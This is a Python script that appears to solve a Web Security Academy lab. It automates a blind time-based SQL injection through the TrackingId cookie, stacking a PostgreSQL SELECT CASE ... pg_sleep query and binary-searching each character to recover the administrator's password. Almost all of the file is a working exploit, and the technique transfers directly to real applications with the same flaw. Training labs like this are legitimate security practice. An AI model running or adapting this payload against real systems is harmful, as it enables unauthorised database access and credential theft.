import sys, time, logging, argparse, urllib3

import requests

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://0aa7002e046da81e8002176c0083008a.web-security-academy.net/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=1",
    "Te": "trailers",
}

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}
log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S"
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy. disabled for now"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()


def is_solved(url):
    def _is_solved(url):
        log.info("Checking if solved.")
        resp = requests.get(url, headers=headers, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            log.info("Lab is solved")
            return True
        else:
            log.info("Not solved.")
            return False
    if _is_solved(url):
        return True
    else:
        time.sleep(2)
        return _is_solved(url)


def main(args):
    url = args.url
    cookies = { "TrackingId": "yZoAxvzqSdhosLWd",
                "session": "Vvah2y3bTMaMuASCdNvoZjXrrtmBlPV4" }
    log.info(f"Getting url: {url}")
    characters = "0123456789abcdefghijklmnopqrstuvwxyz"
    passwd = ''
    for i in range(1, 21):
        m = 0; M = len(characters) - 1
        while m < M:
            c = (M + m) // 2
            log.info(f"Attempting character '{characters[c]}' at index {i}")
            payload = f"x7UFmP1PDPcMN5Qb'%3b SELECT CASE WHEN (SUBSTRING(password,{i},1) > '{characters[c]}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--+"
            cookies["TrackingId"] = payload
            r = requests.get(url, headers=headers, cookies=cookies, proxies=PROXIES, verify=False)
            delta = r.elapsed.total_seconds()
            print(delta)
            if delta >= 2:
                m = c+1
            else:
                M = c-1
        c = m
        payload = f"x7UFmP1PDPcMN5Qb'%3b SELECT CASE WHEN (SUBSTRING(password,{i},1) = '{characters[c]}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--+"
        cookies["TrackingId"] = payload
        r = requests.get(url, headers=headers, cookies=cookies, proxies=PROXIES, verify=False)
        delta = r.elapsed.total_seconds()
        if delta >= 2:
            passwd += characters[c]
        else:
            passwd += characters[c+1]
        log.info(f"Retrived string: {passwd}")
    log.info(f"The password is {passwd}")
    #if is_solved(url):
    #    log.info("Congrats!")
    #else:
    #    log.info("Not solved :(")


if __name__ == "__main__":
    args = parse_args(sys.argv)
    main(args)
